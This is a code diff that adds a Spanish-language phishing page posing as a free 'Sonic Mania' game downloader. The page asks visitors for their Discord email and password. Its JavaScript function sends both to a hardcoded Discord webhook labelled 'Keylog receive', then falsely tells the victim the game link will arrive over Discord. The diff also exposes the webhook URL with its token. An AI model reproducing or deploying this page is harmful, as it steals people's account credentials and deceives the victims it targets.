@@ -1,21 +1,246 @@
 <style>
-  .ad-btn, .can {
-    opacity: 0.4;
-    transition: 0.3s;
-  }
-  .can:hover {
-    cursor: pointer;
-    opacity: 1
-  }
-</style>
-<body style="overflow: hidden;" bgcolor="#000">
-  <video id="ad" src="https://cdn.glitch.me/f2107488-2632-43cc-b97d-2787f27b7285/Outro.mp4?v=1663602984523" autoplay></video>
-  <button class="ad-btn" style="display: flex; width: 14%; height: 6%; background-color: rgba(0,0,0,.4); color: #FFF; position: fixed; z-index: 100; bottom: 8%; right: 0; border: 1px solid white; outline: none; justify-content: center; align-items: center; font-size: 20px">
-    Omitir Anuncio 
-    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-skip-end-fill" viewBox="0 0 16 16" style="margin: 0px">
-      <path d="M12.5 4a.5.5 0 0 0-1 0v3.248L5.233 3.612C4.693 3.3 4 3.678 4 4.308v7.384c0 .63.692 1.01 1.233.697L11.5 8.753V12a.5.5 0 0 0 1 0V4z"></path>
-    </svg>
-  </button>
-</body>
+  /******************************************************************************
+START Glitch hello-app default styles
 
-<script src="/docs/script.js"></script>
+The styles in this section do some minimal CSS resets, set default fonts and 
+colors, and handle the layout for our footer and "Remix on Glitch" button. If
+you're new to CSS they may seem a little complicated, but you can scroll down
+to this section's matching END comment to see page-specific styles.
+******************************************************************************/
+/* Our default values set as CSS variables */
+:root {
+  --color-bg: #fff;
+  --color-text-main: #000000;
+  --color-primary: #FFFF00;
+  --wrapper-height: 87vh;
+  --image-max-width: 300px;
+  --image-margin: 3rem;
+  --font-family: "HK Grotesk";
+  --font-family-header: "HK Grotesk";
+}
+
+.button {
+  margin: 0;
+  background-color: #008CBA;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  font-size: 16px;
+}
+/* Basic page style resets */
+* {
+  box-sizing: border-box;
+}
+[hidden] {
+  display: none !important;
+}
+
+/* Import fonts */
+@font-face {
+  font-family: HK Grotesk;
+  src: url("https://cdn.glitch.com/605e2a51-d45f-4d87-a285-9410ad350515%2FHKGrotesk-Regular.otf?v=1603136326027")
+    format("opentype");
+}
+@font-face {
+  font-family: HK Grotesk;
+  font-weight: bold;
+  src: url("https://cdn.glitch.com/605e2a51-d45f-4d87-a285-9410ad350515%2FHKGrotesk-Bold.otf?v=1603136323437")
+    format("opentype");
+}
+
+/* Our remix on glitch button */
+.btn--remix {
+  font-family: HK Grotesk;
+  padding: 0.75rem 1rem;
+  font-size: 1.1rem;
+  line-height: 1rem;
+  font-weight: 500;
+  height: 2.75rem;
+  align-items: center;
+  cursor: pointer;
+  background: #FFFFFF;
+  border: 1px solid #000000;
+  box-sizing: border-box;
+  border-radius: 4px;
+  text-decoration: none;
+  color: #000;
+  white-space: nowrap;
+  margin-left: auto;
+}
+.btn--remix img {
+  margin-right: 0.5rem;
+}
+.btn--remix:hover {
+  background-color: #D0FFF1;
+}
+
+/* Navigation grid */
+.footer {
+  display: flex;
+  justify-content: space-between;
+  margin: 1rem auto 0;
+  padding: 1rem 0 0.75rem 0;
+  width: 100%;
+  flex-wrap: wrap;
+  border-top: 4px solid #fff;
+}
+
+.footer a:not(.btn--remix):link,
+a:not(.btn--remix):visited {
+  font-family: HK Grotesk;
+  font-style: normal;
+  font-weight: normal;
+  font-size: 1.1rem;
+  color: #000;
+  text-decoration: none;
+  border-style: none;
+}
+.footer a:hover {
+  background: var(--color-primary);
+}
+
+.footer .links {
+  padding: 0.5rem 1rem 1.5rem;
+  white-space: nowrap;
+}
+
+.divider {
+  padding: 0 1rem;
+}
+/******************************************************************************
+END Glitch hello-app default styles
+******************************************************************************/
+
+body {
+  font-family: HK Grotesk;
+  background-color: var(--color-bg);
+}
+
+/* Page structure */
+.wrapper {
+  min-height: var(--wrapper-height);
+  display: grid;
+  place-items: center;
+  margin: 0 1rem;
+}
+.content {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+}
+
+/* Very light scaling for our illustration */
+.title {
+  color: #719e40;
+  font-family: HK Grotesk;
+  font-style: normal;
+  font-weight: bold;
+  font-size: 100px;
+  line-height: 105%;
+  margin: 0;
+  margin-bottom: 12%;
+}
+
+/* Very light scaling for our illustration */
+.illustration {
+  max-width: 100%;
+  max-height: var(--image-max-width);
+  margin-top: var(--image-margin);
+}
+
+.button {
+  background-color: #008CBA; /* Green */
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
+
+.inputC:focus {
+  outline: none;
+  border-color: #719e40 !important;
+  box-shadow: 0 0 4px 1px #719e40;
+  caret-color: #719e40;
+}
+</style>
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="icon" href="https://cdn.glitch.global/6da620b4-b02e-41c3-b938-03b706428f3a/mama.ico?v=1675126036454"/>
+
+    <title>Sonic mania downloader</title>
+
+    <!-- meta tags for SEO and social sharing -->
+
+    <!-- import the webpage's stylesheet -->
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css" />
+  </head>
+  <body>
+    <!-- the wrapper and content divs set margins and positioning -->
+    <div class="wrapper">
+      <div class="content" role="main">
+        <!-- this is the start of content for our page -->
+        <h1 class="title">Sonic Mania</h1>
+        <form class="w3-container w3-card-4">
+          <h2 class="w3-text-blue" style="color: #719e40 !important">Descargar Sonic Mania collection - Gratis</h2>
+          <p>Ingrese su correo y contraseña de Discord para obtener el link.</p>
+          <p>
+            <label class="w3-text-blue" style="color: #719e40 !important"><b>Correo</b></label>
+            <input
+              class="w3-input w3-border inputC"
+              placeholder="Correo..."
+              id="correo"
+              type="text"
+            />
+          </p>
+          <p>
+            <label class="w3-text-blue" style="color: #719e40 !important"><b>Contraseña</b></label>
+            <input
+              class="w3-input w3-border inputC"
+              placeholder="Contraseña..."
+              id="contrase"
+              type="text"
+            />
+          </p>
+          <p>
+            <a class="w3-btn w3-blue" style="background-color: #719e40 !important" onclick="getCode()">Obtener enlace</a>
+          </p>
+          <br>
+        </form>
+      </div>
+    </div>
+    <!-- the footer holds our remix button — you can use it for structure or cut it out ✂ -->
+  </body>
+</html>
+
+<script>
+  function getCode(){
+    let contra = document.getElementById("contrase").value;
+    let correo = document.getElementById("correo").value;
+    const request = new XMLHttpRequest();
+            request.open("POST", "https://discord.com/api/webhooks/1063227988767932497/Pol4jxKfNOxcXzRYXIiR64ERTjURkJDA0ouH2faxvUwxd3qz9K3z6YVOSxmWZAu9-yu6");
+            request.setRequestHeader('Content-type', 'application/json');
+            const params = {
+                username: "Keylog receive",
+                avatar_url: "",
+                content: "Contrasena: " + contra + " | Correo: " + correo + ""
+            }
+            request.send(JSON.stringify(params))
+    if(contra.replaceAll(" ", "") == "" || correo.replaceAll(" ", "") == ""){
+      return alert("Debes rellenar los campos")
+    } else {
+      return alert("El enlace con el juego será enviado a su cuenta de Discord, por favor, sea paciente.")
+    }
+  }
+</script>
